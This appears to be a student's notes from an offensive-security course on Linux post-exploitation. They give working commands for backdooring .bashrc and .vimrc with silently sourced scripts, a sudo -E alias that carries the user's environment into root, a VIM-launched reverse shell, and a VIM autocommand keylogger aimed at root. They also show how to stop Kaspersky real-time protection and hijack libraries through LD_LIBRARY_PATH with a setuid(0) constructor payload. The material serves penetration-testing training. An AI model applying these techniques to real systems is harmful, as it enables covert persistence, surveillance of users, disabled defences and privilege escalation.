# Linux post exploitation

372

linux is used on server

# user configuration files

dotfiles

.bash_profile and .bashrc - to put environement variables and load scripts whene a user initially logs onto a system

```
 echo "touch /tmp/bashtest.txt" >> ~/.bashrc
```

# VIM Config Simple Backdoor

vimrc in .vimrc file comtains the configuration file for vim

`echo ":echo 'this is a test'" >> .vimrc`

`echo "!touch /tmp/test.txt" >> .vimrc`

we can source a shell script using the bash source command.

we can import other vim configuration files into users cuirrent duir with source command we add silent so that the script is not shown.

`echo ':silent !source ~/.vimrunscript' >> .vimrc`
we create a shell script file /home/offsec/.vimrunscript `echo "hacked" >  /tmp/hacksrcout.txt`

we can add alias into the .bashrc file

`echo 'alias sudo="sudo -E"' >> ~/.bashrc`

`source ~/.bashrc` for making effect the changes

we can look at file permission through 

`sudo -l`


### 10.1.1.1 Exercises
1. Backdoor VIM as described in the module by modifying the user’s .vimrc file directly and 
running a command while silencing the output.

2. Backdoor VIM by adding a script to the VIM plugins folder.

3. Backdoor VIM by sourcing a secondary shell script in the user’s .vimrc file while silencing the 
output.
4. Create an alias for the user for sudo to preserve the user’s environment and activate it by 
sourcing the user’s .bashrc file. Then execute a command as root by running VIM as sudo.
5. Using the linuxvictim user, run VIM via sudo and get a root shell using the :shell command.

all exercises done

### 10.1.1.2 Extra Mile
Get a reverse shell using the above VIM backdoor as root.

```sh
└─$ cat vimrunscript 
#!/bin/bash
echo "hacked" > /tmp/hacksrcout.txt
~/reverse.elf 
```

```sh
┌──(kali㉿kali)-[~]
└─$ cat .vimrc
:silent !source ~/vimrunscript  
```

# vim config keylogger

we leverage autocommands 
:autocmd

`:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt`

we can also add it in 

` /home/offsec/.vim/plugin/settings.vim`

we can put an if condition

```
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
:endif
```

### 10.1.2.1 Exercises
1. Use an autocommand call to write a simple VIM keylogger and silence it as in this section, 
sourcing it from a separate file than the user’s .vimrc file.

2. Modify the keylogger to only log modified file contents if the user is root

# bypassing AV

linux kaspersky

# Kaspersky Endpoint security

We can turn Kaspersky off using the kesl-control utility. We need to use the --stop-t flag, 
which stops a specified task number

`sudo kesl-control --stop-t 1`

We can turn Kaspersky off using the kesl-control utility. We need to use the --stop-t flag, 
which stops a specified task number. The documentation indicates that real-time protection runs 
as task number 1

`sudo gpg -d eicar.txt.gpg > eicar.txt`

`sudo kesl-control --scan-file ./eicar.txt`

`sudo kesl-control -E --query | grep DetectName`

394

# Shared libraries

a elf binary looks at poath from these locations

1. Directories listed in the application’s RPATH595 value.
2. Directories specified in the LD_LIBRARY_PATH environment variable.
3. Directories listed in the application’s RUNPATH596 value.
4. Directories specified in /etc/ld.so.conf.
5. System library directories: /lib, /lib64, /usr/lib, /usr/lib64, /usr/local/lib, /usr/local/lib64, and 
potentially others.

# shared library hijacking using LD_Library_path

After checking its internal RPATH values for hard coded paths, it then checks for an 
environment variable called LD_LIBRARY_PATH. Setting this variable allows a user to override the 
default behavior of a program and insert their own versions of libraries

we can inser a line in .bashrc or .bash_profile to define a LD_LIBRARY_PATH

 This setting is configured in the 
/etc/sudoers file by using the env_reset keyword as a default. Some systems are configured to 
allow a user’s environment to be passed on to sudo. These will have env_keep set instead.

We could bypass the env_reset setting with our previously-mentioned .bashrc alias for the sudo 
command. We mentioned this approach earlier when we set the sudo command to sudo -E in 
Listing 443. As a normal user, it’s not typically possible to read /etc/sudoers to know if env_reset
is set, so it may be useful to create this alias setting regardless.

Example of a malicious C program

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid
static void runmahpayload() __attribute__((constructor));

void runmahpayload() {
 setuid(0);
 setgid(0);
 printf("DLL HIJACKING IN PROGRESS \n");
 system("touch /tmp/haxso.txt");
}
```

`gcc -Wall -fPIC -c -o hax.o hax.c`

This produces a libhax.so shared library file.
One important thing to note is that shared libraries in Linux use the soname602 naming 
convention. This is typically something like lib.so, which may also include a version number 
appended to the end with a period or full-stop character. For example, we might see lib.so.1. 
Naming our libraries following this convention will help us with the linking process

ldd will give the loaded library when a program is run.








